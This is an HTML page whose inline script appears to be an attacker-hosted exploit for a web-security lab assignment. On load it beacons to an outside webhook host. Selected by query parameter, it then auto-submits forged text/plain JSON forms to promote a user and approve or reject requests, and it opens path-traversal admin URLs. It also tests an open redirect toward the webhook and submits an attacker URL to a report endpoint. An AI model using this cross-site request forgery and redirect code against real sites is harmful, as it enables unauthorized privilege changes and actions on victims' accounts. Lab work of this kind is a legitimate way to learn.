<!doctype html>
<html>
<head><meta charset="utf-8"></head>
<body>
<script>
// v13: adds t=beacon (pure beacon, NO navigation) for queue-timing oracles.
var W    = 'https://peaceful-fish-56.webhook.cool';
var BASE = 'https://10.20.18.55:2070/labs/assignment03/environment/1/';
var q    = new URLSearchParams(location.search);
var mode = q.get('t') || 'reject';
var rid  = q.get('r') || '7';
var tag  = mode + '-' + rid;

try { fetch(W + '/c1?tag=' + encodeURIComponent(tag) + '&t=' + Date.now(), { keepalive: true, mode: 'no-cors' }); } catch (e) {}

if (mode === 'beacon') {
  // nothing else — pure timing marker
} else if (mode === 'formpromote' || mode === 'formapprove' || mode === 'formreject') {
  var action;
  if      (mode === 'formpromote') action = BASE + 'api/users/joseph/promote';
  else if (mode === 'formapprove') action = BASE + 'api/requests/' + rid + '/approve';
  else                             action = BASE + 'api/requests/' + rid + '/reject';
  var f = document.createElement('form');
  f.method = 'POST'; f.enctype = 'text/plain'; f.action = action;
  var i = document.createElement('input');
  i.name = '{"a":"b","x":"'; i.value = '"}';
  f.appendChild(i);
  document.body.appendChild(f);
  f.submit();
} else if (mode === 'popweb') {
  window.open(W + '/popup');
} else if (mode === 'popchall') {
  window.open(BASE + '?view=admin&request=../requests/' + rid + '/reject?/seen');
} else if (mode === 'anchchall') {
  var a = document.createElement('a');
  a.href = BASE + '?view=admin&request=../requests/' + rid + '/reject?/seen';
  a.target = '_blank';
  document.body.appendChild(a);
  a.click();
} else if (mode === 'formreport') {
  var fr = document.createElement('form');
  fr.method = 'POST'; fr.action = BASE + '?view=report';
  var ir = document.createElement('input');
  ir.type = 'hidden'; ir.name = 'report_url'; ir.value = W + '/adminqueued';
  fr.appendChild(ir);
  document.body.appendChild(fr);
  fr.submit();
} else {
  var target;
  if      (mode === 'promote') { target = BASE + '?view=admin&request=../users/joseph/promote?/seen'; }
  else if (mode === 'aget')    { target = BASE + '?view=admin&approve=' + rid; }
  else if (mode === 'pjoseph') { target = BASE + '?view=admin&promote=joseph'; }
  else if (mode === 'next')    { target = 'https://10.20.18.55:2070/login?next=https%3A%2F%2Fpeaceful-fish-56.webhook.cool%2Foss'; }
  else if (mode === 'extnav')  { target = W + '/extnav'; }
  else /* reject oracle */     { target = BASE + '?view=admin&request=../requests/' + encodeURIComponent(rid) + '/reject?/seen'; }
  location.href = target;
}
</script>
</body>
